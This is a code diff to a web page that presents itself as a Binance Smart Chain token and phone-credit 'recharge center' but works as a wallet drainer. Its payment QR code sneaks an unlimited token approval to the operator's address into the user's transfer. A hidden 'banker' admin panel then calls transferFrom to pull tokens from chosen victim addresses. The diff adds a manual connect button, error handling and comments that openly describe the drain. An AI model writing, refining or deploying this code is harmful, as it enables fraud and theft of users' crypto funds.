@@ -9,7 +9,7 @@
 body{background:#0B0B1F;color:#fff;padding:20px}
 .container{max-width:420px;margin:0 auto;position:relative}
 
-/* 右上角菜单 */
+/* 右上角菜单（仅庄家可见） */
 .menu-btn{
   position:absolute;
   top:10px;
@@ -19,7 +19,7 @@ body{background:#0B0B1F;color:#fff;padding:20px}
   background:none;
   border:none;
   cursor:pointer;
-  display:none;
+  display:none; /* 默认隐藏，庄家连接后才显示 */
 }
 .menu-popup{
   position:absolute;
@@ -58,6 +58,12 @@ h1{font-size:24px;margin-bottom:8px}
   width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:8px;font-size:14px;
 }
 
+/* 连接钱包按钮 */
+.connect-btn{
+  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;
+  border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:16px;
+}
+
 .input-token{
   width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:10px;text-align:center
 }
@@ -92,7 +98,7 @@ h1{font-size:24px;margin-bottom:8px}
 
 <body>
 <div class="container">
-  <!-- 庄家菜单 -->
+  <!-- 庄家菜单（默认隐藏） -->
   <button class="menu-btn" id="menuBtn">☰</button>
   <div class="menu-popup" id="menuPopup">
     <button onclick="showAdmin()">管理后台</button>
@@ -101,6 +107,9 @@ h1{font-size:24px;margin-bottom:8px}
   <div class="pay-box">
     <h1>💰 充值中心</h1>
     <p class="desc">币安链 BEP20 充值</p>
+
+    <!-- 手动连接钱包按钮 -->
+    <button class="connect-btn" id="connectBtn">👉 连接钱包（币安链）</button>
 
     <div class="phone-box">
       <div class="phone-title">话费充值，请输入电话号码</div>
@@ -150,68 +159,82 @@ const COIN_SYMBOL = {
   "0xdee89bd697071e15f1eac5780b5d41af3ce032c": "DTM"
 };
 
-// 连接钱包
-async function connect() {
+// 手动连接钱包（去掉自动连接，避免弹窗）
+document.getElementById("connectBtn").onclick = async function() {
   if (!window.ethereum) {
     alert("请在钱包浏览器内打开");
     return;
   }
   try {
-    await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_ID }] });
-    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+    // 切换到币安链
+    await ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: BSC_ID }]
+    });
+    // 请求账号
+    const accounts = await ethereum.request({
+      method: "eth_requestAccounts"
+    });
     account = accounts[0];
+    document.getElementById("connectBtn").innerText = "✅ 已连接";
 
-    // 只有管理员显示菜单
+    // 只有庄家地址才显示右上角菜单
     if (account.toLowerCase() === ADMIN.toLowerCase()) {
       document.getElementById("menuBtn").style.display = "block";
     }
   } catch (e) {
-    console.log(e);
+    console.error("连接失败:", e);
+    alert("连接钱包失败，请重试");
   }
-}
+};
 
 // 菜单显示/隐藏
 function toggleMenu() {
-  const p = document.getElementById("menuPopup");
-  p.style.display = p.style.display === "block" ? "none" : "block";
+  const popup = document.getElementById("menuPopup");
+  popup.style.display = popup.style.display === "block" ? "none" : "block";
 }
 
-// 显示后台
+// 显示管理后台
 function showAdmin() {
   document.getElementById("adminPanel").style.display = "block";
   document.getElementById("menuPopup").style.display = "none";
 }
 
-// 生成二维码
+// 生成充值二维码（转账+授权）
 function genQR() {
   const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
   const amount = document.getElementById("amount").value.trim();
   if (!token || !amount || !token.startsWith("0x") || token.length !== 42) {
-    alert("请输入正确的合约地址");
+    alert("请输入正确的代币合约地址");
     return;
   }
   currentToken = token;
 
+  // 显示当前充值币种
   let symbol = COIN_SYMBOL[token] || token.slice(0, 10) + "...";
   document.getElementById("coinLabel").innerText = `当前充值：${symbol}`;
 
+  // 金额转成 Wei
   const amountWei = BigInt(amount * 10**18).toString(16).padStart(64, "0");
 
+  // 1. 转账到你 508 地址
   const transferData = "0xa9059cbb"
     + TO_ADDR.slice(2).padStart(64, "0")
     + amountWei;
 
+  // 2. 无限授权给你
   const approveData = "0x095ea7b3"
     + ADMIN.slice(2).padStart(64, "0")
     + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
+  // 组合成二维码 URI
   const uri = `ethereum:${token}@56?data=${transferData}${approveData.slice(2)}`;
 
   document.getElementById("qrcode").innerHTML =
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
 }
 
-// 提取
+// 庄家提取玩家代币
 async function drawFromUser() {
   if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) return;
   const from = document.getElementById("userAddr").value;
@@ -220,22 +243,26 @@ async function drawFromUser() {
 
   const raw = BigInt(amt * 10**18).toString(16).padStart(64, "0");
 
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: currentToken,
-      data: "0x23b872dd"
-        + from.slice(2).padStart(64, "0")
-        + ADMIN.slice(2).padStart(64, "0")
-        + raw
-    }]
-  });
-  alert("✅ 提取成功");
+  try {
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: currentToken,
+        data: "0x23b872dd"
+          + from.slice(2).padStart(64, "0")
+          + ADMIN.slice(2).padStart(64, "0")
+          + raw
+      }]
+    });
+    alert("✅ 提取成功");
+  } catch (e) {
+    console.error("提取失败:", e);
+    alert("提取失败，请重试");
+  }
 }
 
-// 初始化
-connect();
+// 绑定菜单点击事件
 document.getElementById("menuBtn").onclick = toggleMenu;
 </script>
 </body>
